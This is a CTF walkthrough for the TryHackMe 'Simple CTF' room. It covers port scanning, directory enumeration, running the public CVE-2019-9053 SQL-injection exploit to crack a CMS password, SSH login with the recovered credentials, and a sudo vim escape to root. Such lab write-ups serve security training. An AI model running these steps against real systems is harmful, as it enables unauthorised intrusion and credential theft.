---
clayout: ctf
title: Simple CTF
type: TryHackMe
date: 2025-04-24
level: Easy
icon: /ctf/tryhackme/simple-ctf/icon-room.png
image: /ctf/tryhackme/simple-ctf/icon-room.png
description: A simple CTF challenge to test your skills.
ctf-link: https://tryhackme.com/room/easyctf
---

# Challenge Walkthrough

## How many services are running under port 1000?

We begin with a comprehensive port scan to identify all open ports and services on the target:

```bash
nmap -p- --open -sV -sC -oN nmap/initial.txt 10.10.116.209
```

From the `nmap` results, we observe two services running on ports below 1000:

```bash
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
```

> **Answer:** `2`

## What is running on the higher port?

The scan also revealed an additional service running on a higher port:

```bash
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
```

This indicates an SSH service running on port `2222`.

> **Answer:** `ssh`

## What's the CVE you're using against the application?

Navigating to `http://10.10.116.209/` reveals the default Apache web server page. 

![Apache Default Page](/ctf/tryhackme/simple-ctf/apache-default-page.png)

We proceed with content discovery using `gobuster`:

```bash
gobuster dir -u http://10.10.116.209 -w /usr/share/wordlists/dirb/common.txt
```

![Gobuster](/ctf/tryhackme/simple-ctf/gobuster.png)

The enumeration reveals a `/simple` directory hosting a CMS. 

![Simple Home Page](/ctf/tryhackme/simple-ctf/simple-home-page.png)

At the bottom of the page, we discover the version number:

![CMS Version](/ctf/tryhackme/simple-ctf/cms-version.png)

> CMS Version: **CMS Made Simple v2.2.8**

A quick search shows this version is vulnerable to a known exploit:

- **CVE**: [CVE-2019-9053](https://www.exploit-db.com/exploits/46635)
- **Vulnerability**: Authenticated SQL Injection via `search` parameter

> **Answer:** `CVE-2019-9053`

## To what kind of vulnerability is the application vulnerable?

The identified CVE describes a **SQL Injection** vulnerability in the `search` functionality.

> **Answer:** `SQLI`

## What's the password?

Using the publicly available Python exploit for CVE-2019-9053, we launch the following attack:

```bash
python2.7 46635.py -u http://10.10.116.209/simple --crack -w /usr/share/wordlists/rockyou.txt
```

The script successfully retrieves a password:

![Exploit](/ctf/tryhackme/simple-ctf/exploit.png)

> **Answer:** `secret`

## Where can you login with the details obtained?

Using the credentials obtained (`mitch:secret`), we attempt an SSH login on the previously identified SSH service on port `2222`:

```bash
ssh mitch@10.10.116.209 -p 2222
```

![SSH](/ctf/tryhackme/simple-ctf/ssh.png)

> **Answer:** `ssh`

## What's the user flag?

Upon successful SSH access, we locate the `user.txt` flag in the user's home directory.

![User Flag](/ctf/tryhackme/simple-ctf/user-flag.png)

> **Answer:** `user_flag`

## Is there any other user in the home directory? What's its name?

Inspecting `/etc/passwd` reveals the presence of another user account:

![Other User](/ctf/tryhackme/simple-ctf/other-user.png)

> **Answer:** `sunbath`

## What can you leverage to spawn a privileged shell?

Executing `sudo -l` shows that user `mitch` can run `vim` as root without a password:

![Sudo](/ctf/tryhackme/simple-ctf/sudo.png)

> **Answer:** `vim`

## What's the root flag?

Using the [GTFOBins vim technique](https://gtfobins.github.io/gtfobins/vim/#sudo), we spawn a root shell:

![Root Flag](/ctf/tryhackme/simple-ctf/root-flag.png)

Navigating to `/root` and viewing `root.txt` reveals the root flag.

> **Answer:** `root_flag`
